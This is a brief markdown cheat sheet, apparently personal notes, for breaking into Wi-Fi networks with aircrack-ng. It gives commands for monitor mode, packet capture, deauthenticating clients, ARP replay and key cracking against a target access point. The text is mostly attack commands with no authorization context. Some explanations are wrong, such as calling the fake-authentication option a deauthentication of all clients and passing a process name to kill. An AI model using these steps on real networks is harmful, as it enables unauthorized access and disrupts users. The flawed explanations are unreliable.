# Wireless Vulnerablities
## overview of tools 
### aircrack-ng  
##### change wifi card from promiscuous to monitor mode.  
1. `ifconfig`  
2. `ifconfig wlan0 down`  
3. `iwconfig wlan0 mode monitor`  
4. `ifconfig wlan0 up`  
##### check airmon-ng is good to go
1. `airmon-ng check wlan0`  
2. kill processes that are running.  `kill NetworkManager`  
##### run airodump-ng
1. `airodump-ng wlan0`  
2. `airodump-ng --channel 1 --bssid 12:34:45:45:67:80 --write dump.pca wlan0`  
3. `sudo aireplay-ng -1 0 -e <target_essid> -a 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>` -1... '0' deauthenticates all clients. -e... ESSID of target access point. -a... MAC address of target access point. -h... MAC address of your choice. its either no mac filtering or mac filtering  
Mac filtering is turned off  
```
18:22:32 Sending Authentication Request
18:22:32 Authentication successful
18:22:32 Sending Association Request
18:22:32 Association successful :-)
```
##### No MAC filtering  
--- `sudo aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>`  -3... Standard ARP-request replay. -b... MAC address of target access point. -h... MAC address of your choice.  
##### MAC filtering 
-- `sudo aireplay-ng -0 5 -a 00:09:5B:D7:43:A8 -c 00:00:00:00:00:00 <interface>`  -0... Number of deauthentication attempts. -a... MAC address of target access point.  -c... Client MAC address.  
4. `sudo aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h 00:00:00:00:00:00 <interface>`  -3... Standard ARP-request replay. -b... MAC address of target access point. -h... Client MAC address.  
##### Decryption with "aircrack-ng" & "aircrack-ptw"  
1. `sudo aircrack-ng <file_name>.cap`  
2. `./aircrack-ptw <file_name>.cap`  
[Aircrack-ng](http://aircrack-ng.org/doku.php?id=aircrack-ng)
